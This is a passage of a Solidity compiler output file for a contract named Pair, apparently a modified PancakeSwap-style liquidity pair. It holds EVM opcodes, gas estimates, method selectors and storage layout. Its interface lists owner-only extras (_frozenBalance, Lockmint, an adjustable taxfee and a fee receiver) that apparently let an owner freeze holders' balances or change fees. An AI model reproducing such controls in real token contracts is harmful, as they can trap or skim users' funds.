0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1CDA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1CEE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1D04 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x10 SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1DD6 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1DB7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1E38 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1E3D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1E6B JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1E6B JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1E68 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1EBC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A205452414E534645525F4641494C45440000000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO DUP1 PUSH2 0x1EDE JUMPI POP POP DUP1 DUP3 MUL DUP3 DUP3 DUP3 DUP2 PUSH2 0x1EDB JUMPI INVALID JUMPDEST DIV EQ JUMPDEST PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6D756C2D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 GT DUP1 ISZERO SWAP1 PUSH2 0x1F94 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 GT ISZERO JUMPDEST PUSH2 0x1FD9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x50616E63616B653A204F564552464C4F57 PUSH1 0x78 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0xB SLOAD PUSH4 0xFFFFFFFF TIMESTAMP DUP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV DUP2 AND DUP3 SUB SWAP1 DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x2009 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 AND ISZERO ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x201D JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 AND ISZERO ISZERO JUMPDEST ISZERO PUSH2 0x208E JUMPI DUP1 PUSH4 0xFFFFFFFF AND PUSH2 0x204B DUP6 PUSH2 0x2036 DUP7 PUSH2 0x2616 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x2628 AND JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE PUSH4 0xFFFFFFFF DUP2 AND PUSH2 0x2076 DUP5 PUSH2 0x2036 DUP8 PUSH2 0x2616 JUMP JUMPDEST PUSH1 0xD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE JUMPDEST PUSH1 0xB DUP1 SLOAD PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP2 SWAP1 SWAP2 OR PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x70 SHL NOT AND PUSH1 0x1 PUSH1 0x70 SHL DUP9 DUP4 AND DUP2 MUL SWAP2 SWAP1 SWAP2 OR PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH1 0x1 PUSH1 0xE0 SHL PUSH4 0xFFFFFFFF DUP8 AND MUL OR SWAP3 DUP4 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP4 DIV SWAP1 SWAP2 AND PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD PUSH32 0x1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1 SWAP3 SWAP2 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x21C4 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x21F9 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x17E7E58 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2294 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x22A8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x22BE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xE SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND ISZERO DUP1 ISZERO SWAP5 POP SWAP2 SWAP3 POP SWAP1 PUSH2 0x23A2 JUMPI DUP1 ISZERO PUSH2 0x239D JUMPI PUSH1 0x0 PUSH2 0x2301 PUSH2 0x1075 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP1 DUP9 AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x230E DUP4 PUSH2 0x23B6 JUMP JUMPDEST SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x239A JUMPI PUSH1 0x0 PUSH2 0x2341 PUSH1 0x8 PUSH2 0xBAA PUSH2 0x2332 DUP7 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x2376 PUSH2 0x2359 DUP5 PUSH1 0x8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0x236A DUP7 PUSH1 0x11 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 DUP4 DUP2 PUSH2 0x2383 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 ISZERO PUSH2 0x2396 JUMPI PUSH2 0x2396 DUP8 DUP3 PUSH2 0x2408 JUMP JUMPDEST POP POP POP JUMPDEST POP POP JUMPDEST PUSH2 0x23AE JUMP JUMPDEST DUP1 ISZERO PUSH2 0x23AE JUMPI PUSH1 0x0 PUSH1 0xE SSTORE JUMPDEST POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 DUP3 GT ISZERO PUSH2 0x23F9 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x2 DUP3 DIV ADD JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x23F3 JUMPI DUP1 SWAP2 POP PUSH1 0x2 DUP2 DUP3 DUP6 DUP2 PUSH2 0x23E2 JUMPI INVALID JUMPDEST DIV ADD DUP2 PUSH2 0x23EB JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x23CB JUMP JUMPDEST POP PUSH2 0x2403 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x2403 JUMPI POP PUSH1 0x1 JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x241B SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2446 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x249B JUMPI DUP2 PUSH2 0x249D JUMP JUMPDEST DUP3 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x24CD SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP2 SWAP1 SWAP2 SSTORE SLOAD PUSH2 0x24FA SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x258D JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x42455032303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x25A0 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x25CB SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP7 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND PUSH1 0x1 PUSH1 0x70 SHL MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB DUP5 AND DUP2 PUSH2 0x2645 JUMPI INVALID JUMPDEST DIV SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID 0x4F PUSH15 0x6C79206F776E65722063616E206361 PUSH13 0x6C20746869732066756E637469 PUSH16 0x6E50616E63616B653A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x49 0x4E POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD SSTORE PUSH15 0x697377617056323A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F TIMESTAMP SSTORE MSTORE 0x4E GASLIMIT DIFFICULTY 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4F SSTORE SLOAD POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCF SWAP1 DUP10 0xF7 DUP8 0xDB 0x5C 0x2A PUSH13 0xA32EBE2DC67686BE59FF857F8A 0xC4 PUSH26 0xE4A2EDBCA7AAF7C464736F6C6343000510003245495037313244 PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "2037400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"DOMAIN_SEPARATOR()": "1088",
						"FeeResiver()": "1104",
						"Lockmint(address)": "infinite",
						"MINIMUM_LIQUIDITY()": "243",
						"PERMIT_TYPEHASH()": "244",
						"_frozenBalance(address)": "1236",
						"allowance(address,address)": "1305",
						"approve(address,uint256)": "22433",
						"balanceOf(address)": "1170",
						"burn(address)": "infinite",
						"decimals()": "275",
						"factory()": "1126",
						"getReserves()": "1240",
						"initialize(address,address,uint256)": "62865",
						"kLast()": "1066",
						"mint(address)": "infinite",
						"name()": "infinite",
						"nonces(address)": "1214",
						"owner()": "1082",
						"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
						"price0CumulativeLast()": "1043",
						"price1CumulativeLast()": "1065",
						"skim(address)": "infinite",
						"swap(uint256,uint256,address,bytes)": "infinite",
						"symbol()": "infinite",
						"sync()": "infinite",
						"taxfee()": "1108",
						"taxfeeupdate(uint256)": "infinite",
						"token0()": "1083",
						"token1()": "1148",
						"totalSupply()": "1088",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite"
					},
					"internal": {
						"_mintFee(uint112,uint112)": "infinite",
						"_safeTransfer(address,address,uint256)": "infinite",
						"_update(uint256,uint256,uint112,uint112)": "infinite"
					}
				},
				"methodIdentifiers": {
					"DOMAIN_SEPARATOR()": "3644e515",
					"FeeResiver()": "900820d8",
					"Lockmint(address)": "dcbbb373",
					"MINIMUM_LIQUIDITY()": "ba9a7a56",
					"PERMIT_TYPEHASH()": "30adf81f",
					"_frozenBalance(address)": "47d5d856",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"burn(address)": "89afcb44",
					"decimals()": "313ce567",
					"factory()": "c45a0155",
					"getReserves()": "0902f1ac",
					"initialize(address,address,uint256)": "1794bb3c",
					"kLast()": "7464fc3d",
					"mint(address)": "6a627842",
					"name()": "06fdde03",
					"nonces(address)": "7ecebe00",
					"owner()": "8da5cb5b",
					"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
					"price0CumulativeLast()": "5909c0d5",
					"price1CumulativeLast()": "5a3d5493",
					"skim(address)": "bc25cf77",
					"swap(uint256,uint256,address,bytes)": "022c0d9f",
					"symbol()": "95d89b41",
					"sync()": "fff6cae9",
					"taxfee()": "f317739c",
					"taxfeeupdate(uint256)": "6488f7b0",
					"token0()": "0dfe1681",
					"token1()": "d21220a7",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 19,
						"contract": "Pair.sol:Pair",
						"label": "totalSupply",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 23,
						"contract": "Pair.sol:Pair",
						"label": "balanceOf",
						"offset": 0,
						"slot": "1",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 29,
						"contract": "Pair.sol:Pair",
						"label": "allowance",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 33,
						"contract": "Pair.sol:Pair",
						"label": "_frozenBalance",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 35,
						"contract": "Pair.sol:Pair",
						"label": "DOMAIN_SEPARATOR",
						"offset": 0,
						"slot": "4",
						"type": "t_bytes32"
					},
					{
						"astId": 42,
						"contract": "Pair.sol:Pair",
						"label": "nonces",
						"offset": 0,
						"slot": "5",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 950,
						"contract": "Pair.sol:Pair",
						"label": "FeeResiver",
						"offset": 0,
						"slot": "6",
						"type": "t_address"
					},
					{
						"astId": 966,
						"contract": "Pair.sol:Pair",
						"label": "factory",
						"offset": 0,
						"slot": "7",
						"type": "t_address"
					},
					{
						"astId": 968,
						"contract": "Pair.sol:Pair",
						"label": "token0",
						"offset": 0,
						"slot": "8",
						"type": "t_address"
					},
					{
						"astId": 970,
						"contract": "Pair.sol:Pair",
						"label": "token1",
						"offset": 0,
						"slot": "9",
						"type": "t_address"
					},
					{
						"astId": 972,
						"contract": "Pair.sol:Pair",
						"label": "taxfee",
						"offset": 0,
						"slot": "10",
						"type": "t_uint256"
					},
					{
						"astId": 974,
						"contract": "Pair.sol:Pair",
						"label": "reserve0",
						"offset": 0,
						"slot": "11",
						"type": "t_uint112"
					},
					{
						"astId": 976,
						"contract": "Pair.sol:Pair",
						"label": "reserve1",
						"offset": 14,
						"slot": "11",
						"type": "t_uint112"
					},
					{
						"astId": 978,
						"contract": "Pair.sol:Pair",
						"label": "blockTimestampLast",
						"offset": 28,
						"slot": "11",
						"type": "t_uint32"
					},
					{
						"astId": 980,
						"contract": "Pair.sol:Pair",
						"label": "price0CumulativeLast",
						"offset": 0,
						"slot": "12",
						"type": "t_uint256"
					},
					{
						"astId": 982,
						"contract": "Pair.sol:Pair",
						"label": "price1CumulativeLast",
						"offset": 0,
						"slot": "13",
						"type": "t_uint256"
					},
					{
						"astId": 984,
						"contract": "Pair.sol:Pair",
						"label": "kLast",
						"offset": 0,
						"slot": "14",
						"type": "t_uint256"
					},
					{
						"astId": 986,
						"contract": "Pair.sol:Pair",
						"label": "owner",
						"offset": 0,
						"slot": "15",
						"type": "t_address"
					},
					{
						"astId": 989,
						"contract": "Pair.sol:Pair",
						"label": "unlocked",
						"offset": 0,
						"slot": "16",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
